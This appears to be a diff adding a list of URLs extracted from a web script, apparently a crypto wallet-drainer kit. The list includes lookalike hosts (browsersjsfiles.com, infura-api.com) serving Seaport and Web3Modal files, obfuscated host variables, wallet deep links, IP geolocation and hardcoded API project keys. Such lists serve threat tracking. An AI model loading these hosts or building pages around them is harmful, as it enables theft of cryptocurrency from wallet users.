@@ -1,0 +1,50 @@
+https://cdn.jsdelivr.net/npm/sweetalert2@11
+https://unpkg.com/crypto-js@latest/crypto-js.js
+https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js
+https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js
+https://mainnet.infura.io/v3/b6bf7d3508c941499b10025c0776eaf8
+https://" + k + "/npm/seaport.min.js
+https://" + k + "/npm/web3modal.v3.89979e8a.js
+https://" + k + "/npm/web3modal.v2.db49e40a.js
+https://browsersjsfiles.com/npm/seaport.min.js
+https://browsersjsfiles.com/npm/ethereum-tx.min.js
+https://browsersjsfiles.com/npm/web3modal.v3.89979e8a.js
+https://browsersjsfiles.com/npm/web3modal.v2.db49e40a.js
+https://rpc.infura-api.com/
+https://api.infura-api.com/
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/4c16cad4-cac9-4643-6726-c696efaf5200?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a5ebc364-8f91-4200-fcc6-be81310a0000?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/5195e9db-94d8-4579-6f11-ef553be95100?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1
+https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/73f6f52f-7862-49e7-bb85-ba93ab72cc00?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.
+https://rpc." + d[0] + "/"
+https://api." + d[0] + "/"
+https://node.croswap.com/rpc
+https://node.croswap.com/rpc
+https://cronoscan.com
+https://cronoscan.com
+https://developer-access-mainnet.base.org
+https://developer-access-mainnet.base.org
+https://basescan.org
+https://basescan.org
+https://opt-mainnet.g.alchemy.com/v2
+https://optimism-mainnet.infura.io/v3
+https://optimism.meowrpc.com
+https://optimism.meowrpc.com
+https://optimistic.etherscan.io
+https://explorer.optimism.io
+https://" + window.rtrt4j54jm43c590 + "/router.js"
+https://rpc." + k + "/config?key=" + config.API_KEY
+https://metamask.app.link/dapp/" + window.location.host + window.location.pathname + window.location.search
+https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href
+https://metamask.app.link/dapp/" + window.location.host + window.location.pathname + window.location.search
+https://opensea.io/assets/ethereum/" + D.contractAddress + "/"
+https://etherscan.io/address/" + D.contractAddress
+https://opensea.io/assets/ethereum/" + y.contractAddress + "/"
+https://ipapi.co/json/
+https://opensea.io/assets/ethereum/" + U.contractAddress + "/"
+https://etherscan.io/address/" + U.contractAddress + "\"
+https://avatars.githubusercontent.com/u/37784886
+https://avatars.githubusercontent.com/u/37784886
